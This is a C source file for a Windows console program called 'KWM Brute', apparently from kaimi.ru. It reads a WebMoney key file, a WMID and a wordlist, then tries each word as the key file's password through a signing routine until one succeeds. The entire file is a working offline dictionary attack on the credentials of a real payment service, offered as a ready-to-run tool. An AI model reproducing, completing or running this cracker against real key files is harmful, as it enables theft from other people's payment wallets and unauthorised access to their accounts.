#undef UNICODE
#include <stdio.h>
#include <windows.h>
#include "signer.h"

UINT timerid;
int number;
int oldnum;
int stringsnum=0;
int ctime=0;

VOID CALLBACK tmr(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
     ctime+=2;
     double x=((double)number)/(double)ctime;
     printf("\rPPS: %8.2f; passwords tried: %u (%3.2f%%)",x,number-1,100.0*(double)number/(double)stringsnum);
     oldnum=number;
}

int main(int argc, char *argv[])
{
    SetConsoleTitle("KWM Brute by Kaimi and dx");
    HANDLE hStdOut=GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hStdOut, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    printf(" _   _  _       _            ___                 _              _            \n( ) ( )( )  _  ( )/'\\_/`\\   (  _`\\              ( )_           ( )           \n| |/'/'| | ( ) | ||     |   | (_) ) _ __  _   _ | ,_)   __     | |_    _   _ \n| , <  | | | | | || (_) |   |  _ <'( '__)( ) ( )| |   /'__`\\   | '_`\\ ( ) ( )\n| |\\`\\ | (_/ \\_) || | | |   | (_) )| |   | (_) || |_ (  ___/   | |_) )| (_) |\n(_) (_)`\\___x___/'(_) (_)   (____/'(_)   `\\___/'`\\__)`\\____)   (_,__/'`\\__, |\n                                                                      ( )_| |\n                                                                      `\\___/'\n _   _                             _        _       \n( ) ( )        _             _    ( )      ( )      \n| |/'/'   _ _ (_)  ___ ___  (_) __| |__   _| |      \n| , <   /'_` )| |/' _ ` _ `\\| |(__   __)/'_` |(`\\/')\n| |\\`\\ ( (_| || || ( ) ( ) || |   | |  ( (_| | >  < \n(_) (_)`\\__,_)(_)(_) (_) (_)(_)   (_)  `\\__,_)(_/\\_)\n                                                    \n");
    SetConsoleTextAttribute(hStdOut, FOREGROUND_RED | FOREGROUND_INTENSITY);
    printf("                              [ http://kaimi.ru ]\n\n");
    SetConsoleTextAttribute(hStdOut, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_RED);
    if(argc<4)
    {
      printf("Usage: kwm.exe kwm_file wmid dict_file\nExample: kwm.exe lol.kwm 123456789012 dict.txt\n");
      return 0;
    }
    
	
    printf("Loading KWM...\n");
    char * fname = argv[1];
    HANDLE file = CreateFile(argv[1],GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if(file == INVALID_HANDLE_VALUE)
    {
          printf("Can't open kwm\n");
          return 0;   
    }
    
    DWORD junk=0;
    int size = GetFileSize(file, 0);
    void* blob = VirtualAlloc(0,size,MEM_COMMIT,PAGE_READWRITE);
    if(!blob)
    {
          printf("Can't allocate memory\n");
          CloseHandle(file);
          return 0;    
    }
    if(!ReadFile(file,blob,size,&junk,0))
    {
          printf("Can't read kwm file\n");
          VirtualFree(blob,0,MEM_RELEASE);
          CloseHandle(file);
          return 0;
    }
    CloseHandle(file);
    
    char * wmid = argv[2];
    
     
    printf("Loading dictionary...\n");
    file = CreateFile(argv[3],GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if(file == INVALID_HANDLE_VALUE)
    {
          printf("Can't open dictionary\n");
          return 0;   
    }
    
    size = GetFileSize(file, 0);
    if(size==0)
    {
          printf("The dictionary is empty\n");
          CloseHandle(file);
          return 0;           
    }
               
    void* tempbuf = VirtualAlloc(0,size,MEM_COMMIT,PAGE_READWRITE);
    if(!tempbuf)
    {
          printf("Can't allocate memory\n");
          CloseHandle(file);
          return 0;    
    }
    
    if(!ReadFile(file,tempbuf,size,&junk,0))
    {
          printf("Can't read dictionary file\n");
          VirtualFree(tempbuf, 0, MEM_RELEASE);
          CloseHandle(file);
          return 0;
    }
    CloseHandle(file);
    
    number = 1;
    oldnum = 1;
    MSG msg;
    
    char* ptr = new char[512];
    int curr = 0, curr2 = 0;
    char* sym = new char[1];
    char lol [] = "1";
    szptr hz;
    

    while(true)
    {
        if(size==curr2 || (*sym=*((char*)tempbuf+curr2++))=='\n' || curr==511)
        {   
             stringsnum++;
             
             curr = 0;
             
             if(size==curr2)
                  break;   
        }
        else
          *(ptr+curr++) = *sym;
    }
    
    printf("Dictionary loaded. Starting...\n");
    
    timerid=SetTimer(0, 0, 2000, &tmr);

    
    curr = 0;
    curr2 = 0;           
    szptr szSign;
    
    Signer sign(wmid, "1", fname); 
    sign.val = false;
    
	
    while(1)
    {
        if(size==curr2 || (*sym=*((char*)tempbuf+curr2++))=='\n' || curr==511)
        {    
             if(*(ptr+curr-1)=='\r')
               *(ptr+curr-1) = 0;
             else
               *(ptr+curr) = 0;
               
             curr = 0;
             
             number++;
             
             sign.m_szPassword=ptr;
             
             if(sign.Sign(lol, szSign))
             {
                   SetConsoleTextAttribute(hStdOut, FOREGROUND_BLUE | FOREGROUND_INTENSITY);
                   printf("\nFound password: %s\n", ptr);
                   SetConsoleTextAttribute(hStdOut, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_RED);
                   break;                     
             }
             
             if(size==curr2)
             {
                  SetConsoleTextAttribute(hStdOut, FOREGROUND_RED | FOREGROUND_INTENSITY);
                  printf("\nPassword not found :(\n");   
                  SetConsoleTextAttribute(hStdOut, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_RED);
                  break;   
             }   
             
             if(GetQueueStatus(QS_TIMER))
             {
               GetMessage(&msg, NULL, 0, 0);
               DispatchMessage(&msg);
             }
        }
        else
          *(ptr+curr++) = *sym;
    }
    
    VirtualFree(tempbuf, 0, MEM_RELEASE);
    KillTimer(0, timerid);
    
    system("PAUSE");
    return 0;
}
